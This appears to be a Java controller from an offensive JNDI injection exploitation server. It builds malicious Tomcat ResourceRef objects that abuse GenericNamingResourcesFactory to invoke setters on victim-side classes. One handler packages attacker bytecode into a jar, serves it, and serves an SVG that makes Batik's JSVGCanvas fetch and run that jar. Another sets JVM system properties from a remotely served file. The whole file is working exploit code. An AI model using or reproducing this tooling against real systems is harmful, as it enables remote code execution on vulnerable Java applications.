package cn.butler.jndi.controller;

import cn.butler.jndi.JndiConfig;
import cn.butler.jndi.annotation.JNDIController;
import cn.butler.jndi.annotation.JNDIMapping;
import cn.butler.jndi.server.WebServer;
import cn.butler.jndi.util.MiscUtil;
import cn.butler.payloads.ObjectPayload;
import cn.butler.thirdparty.payloads.JarHandle.JarPayload;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/Setter")
public class SetterMethodController implements Controller {
    public Object process(String[] classMethodUrl) throws Exception {
        String className = classMethodUrl[0];
        String methodName = classMethodUrl[1];
        String methodParameter = classMethodUrl[2];

        //Reference对象构造
        ResourceRef ref = new ResourceRef(className, null, "", "",
            true, "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory", null);
        ref.add(new StringRefAddr(methodName, methodParameter));
        return ref;
    }

    @JNDIMapping("/JSVGCanvas/{exploit}/{impact}")
    public String[] jSVGCanvasLoadJar(String explot,String impact) throws Exception {
        System.out.println("[GenericNamingResourcesFactory] jSVGCanvasLoadJar");
        System.out.println("[Exploit] Impact: " + explot + ":" + impact);

        String effect = explot+":"+impact;
        Object[] objects = (Object []) ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",effect);

        String className = (String) objects[0];
        byte[] byteCode = (byte[]) objects[1];
        //部署远程jar包
        String jarLocation = JndiConfig.codebase + className + ".jar";
        byte[] jarBytes = JarPayload.createWithJSVG(className, byteCode);
        WebServer.getInstance().serveFile("/" + className + ".jar", jarBytes);

        //部署svg,svg远程jar包无需在同一个位置
//        jarLocation = "http://127.0.0.1:8000/EvilJar-1.0-jar-with-dependencies.jar";
        String randStr = MiscUtil.getRandStr(8);
        String fileName = randStr + ".svg";
        String svgPayload = String.format("<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\">\n" +
            "\t<script type=\"application/java-archive\" xlink:href=\"%s\"/>\n" +
            "</svg>",jarLocation);
        WebServer.getInstance().serveMessage("/" + fileName, svgPayload);
        String svgLocation = JndiConfig.codebase + fileName;

        //类名，方法名，svg地址整理
        String[] classMethodParameter = new String[]{"org.apache.batik.swing.JSVGCanvas","URI",svgLocation};
        return classMethodParameter;
    }

    @JNDIMapping("/SystemConfiguration/{data}")
    public String[] setSystemConfiguration(String data) {
        System.out.println("[GenericNamingResourcesFactory] commons-configuration.jar SystemConfiguration");
        System.out.println("[SystemConfiguration] Set Property: " + data);

        String randStr = MiscUtil.getRandStr(8);
        String fileName = randStr + ".txt";
        WebServer.getInstance().serveFile("/" + fileName, data.getBytes());
        String configLocation = JndiConfig.codebase + fileName;

        return new String[]{"org.apache.commons.configuration.SystemConfiguration","systemProperties",configLocation};
    }
}
